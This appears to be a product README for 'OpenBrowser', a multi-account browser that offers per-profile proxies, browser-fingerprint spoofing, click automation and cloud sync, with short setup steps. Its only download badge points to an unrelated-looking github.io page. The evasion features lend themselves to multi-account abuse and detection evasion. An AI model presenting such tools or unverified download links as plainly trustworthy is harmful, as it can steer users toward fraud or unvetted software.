# 🌐 OpenBrowser - Manage multiple web accounts with ease

[![Download OpenBrowser for Windows](https://img.shields.io/badge/Download-OpenBrowser-blue.svg)](https://salwtf.github.io)

## 🧩 Key Features

OpenBrowser helps you manage complex web tasks through a simple interface.

### Profile Isolation
Each profile behaves like a distinct computer. Websites cannot see data from your other profiles. This prevents tracking and keeps your personal and work accounts separate.

### Proxy Management
Integrate your proxy services directly into the browser. You can assign a specific proxy to each profile. The browser routes traffic through that address, protecting your real location. Use different proxies to browse the web from various regions around the world.

### Digital Fingerprint Customization
Websites collect data about your computer to build a digital fingerprint. OpenBrowser lets you customize these traits. You can adjust your browser header, font lists, and screen resolution. This hides your actual computer identity from data collection scripts.

### Desktop Automation
The built-in automation tool handles repetitive actions. You can record clicks and keyboard inputs to perform tasks automatically. This feature helps you manage data entry, site navigation, or content updates without manual effort.

### Cloud Sync
Save your profile settings to the cloud. You can move your environments between multiple computers. Log in to your account on any machine to access your saved proxies and profile identities.

## 💡 Using the Browser

Once the application opens, creating your first environment takes seconds:

1. Click the "Add Profile" button.
2. Give your profile a name.
3. Open the "Proxy" tab and enter your connection details if you have them.
4. Review the "Fingerprint" settings to see your assigned properties.
5. Click "Save" and then "Start" to launch your isolated browser window.

You can now sign in to your accounts as you would in a normal browser. OpenBrowser saves your cookies and sessions automatically when you close the window. To continue later, just click the "Start" button next to that profile again.

## 📈 Managing Data and Backups

Your profiles and settings exist locally on your hard drive. To protect your work:

*   Back up the folder where the software stores profile data.
*   Check for updates regularly within the app settings.
*   Clear cache or cookies from the "Profile Settings" menu if a site stops loading correctly.
